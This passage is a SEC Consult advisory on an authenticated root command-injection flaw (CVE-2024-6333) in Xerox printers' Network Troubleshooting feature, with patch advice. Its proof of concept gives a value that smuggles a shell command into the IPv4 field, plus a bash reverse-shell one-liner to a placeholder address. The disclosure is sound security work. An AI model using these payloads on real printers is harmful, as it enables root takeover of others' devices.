Business recommendation:
------------------------
SEC Consult recommends Xerox customers to install the latest updates and review
the vendor's security note for further information.

Also make sure to have patches from previous security notes installed, such as
XRX23-020. SEC Consult has re-identified some critical 0-days (unauthenticated RCE,
partial authentication bypass) that were already patched but not clearly
communicated in the previous security notes.

SEC Consult highly recommends to perform a thorough security review of the product
conducted by security professionals to identify and resolve potential further
security issues.

Vulnerability overview/description:
-----------------------------------
1) Authenticated Remote Code Execution (RCE) (CVE-2024-6333)
An attacker authenticated as a user with administrative access to the
web interface of a range of affected Xerox printers can exploit a remote code
execution vulnerability (RCE) as root user. It allows an attacker to execute
commands directly on the operating system of the printer with root permissions.
Consequently, the target Xerox printer can be fully compromised.

Proof of concept:
-----------------
1) Authenticated Remote Code Execution (RCE) (CVE-2024-6333)
The "Network Troubleshooting" menu enables administrators to configure and run
network troubleshooting based on the tcpdump tool. The web interface allows to
apply custom filters like an IPv4 address as well as specific network services,
as seen in the image (figure 1) below.

<img Network_Troubleshooting.png>

Due to insufficient input validation in the IPv4 address value, an attacker
may inject further OS commands into the final tcpdump command string. For
example, by setting the IPv4 address to the value "0.0.0.0$(bash $TMP~cmd)",
commands stored under "/tmp/~cmd" get executed, when starting a network
troubleshooting session.

Note: The payload in the IPv4 address must bypass a character filter,
and was kept simple for demonstration purposes. Other payloads that directly
execute commands without requiring the "/tmp/~cmd" file exist and can be
crafted.

An attacker who, for example, has previously exploited the unauthenticated
RCE vulnerability (fixed with Xerox Security Bulletin XRX23-020) can plant
the following commands for a reverse shell in to "/tmp/~cmd".

-------------------------------------------------------------------------------

bash -i >/dev/tcp/X.X.X.X/10004 0>&1 2>&1

-------------------------------------------------------------------------------

Since, the network troubleshooting service is running tcpdump with root
permissions, full access to a range of Xerox printers can be obtained this way.
See figure 2 below.
